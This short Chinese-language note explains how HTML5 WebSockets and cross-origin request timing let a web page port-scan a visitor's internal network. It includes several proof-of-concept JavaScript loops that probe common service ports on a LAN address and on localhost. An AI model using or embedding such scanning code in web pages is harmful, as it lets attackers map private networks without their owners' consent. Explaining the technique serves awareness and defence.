-----
* 特性：有了HTML5，浏览器现在可以连到任何IP地址或网站的（几乎）任何端口。<br>
      虽然除非目标网站有特别的允许，不然并不能接收到来自任意端口连接的回应，但是研究人员表示，这类请求所花的时间可以用来判

-------
安全性：因此攻击者就可以直接利用浏览器对受害者的内部网络进行端口扫描。<br>
      这两个API都包含readyState属性，它表示在给定时间内的连接状态。<br>
      每个特定的readyState值的持续时长很大程度上是基于到目标端口连接的状态。<br>
      这表明，通过观察这种行为的不同，可以判断端口是open、closed或filterd状态。对于Cross Origin<br> Requests来说readyState为1的持续时间，WebSockets是readyState为0的时间。
      
-----
典例：

----

var host = '192.168.6.40';   
     var scan = undefined;  
     var ports = [80, 443, 445, 1433, 3306, 3389, 8000, 8080];  
     for (var i=0; i < ports.length; i++) {  
          if ("WebSocket" in window) {  
             scan = new WebSocket("ws://" + host + ":" + ports[i]);  
          } else if ("MozWebSocket" in window) {  
           scan = new MozWebSocket("ws://" + host + ":" + ports[i]);  
    }  
    //if (scan.readyState === 1) {  
        //alert('open')  
    alert(scan.readyState);  
    //}  
    }  
    var host = '127.0.0.1'  
    var scan = undefined;  
    var ports = [80, 443, 445, 1433, 3306, 3389, 8000, 8080];  
    for (var i=0; i < ports.length; i++) {  
      if ("WebSocket" in window) {  
        scan = new WebSocket("ws://" + host + ":" + ports[i]);  
      } else if ("MozWebSocket" in window) {  
        scan = new MozWebSocket("ws://" + host + ":" + ports[i]);  
    }  
    scan.onopen = function() {  
        alert("open");  
    }  
   scan.onerror = function(evt) {  
        alert("error");  
     }  
    }
    var allport = [80,443,21,22,23,445,1433,3306,1521,5800,5900];  
    try{  
      var ws;  
      if ("WebSocket" in window){  
        alert("WebSocket is supported by your Browser!");  
        for (i = 0; i<allport.length; i++){  
            var ws= new WebSocket("ws://127.0.0.1:"+ allport[i]);  
            ws.onopen = function() {  
                              alert('ok');  
                                    };  
            ws.onclose = function() {  
                            alert('close');  
                                    }  
          }  
       }  
      }catch(exception){  
         alert(exception);  
    }  
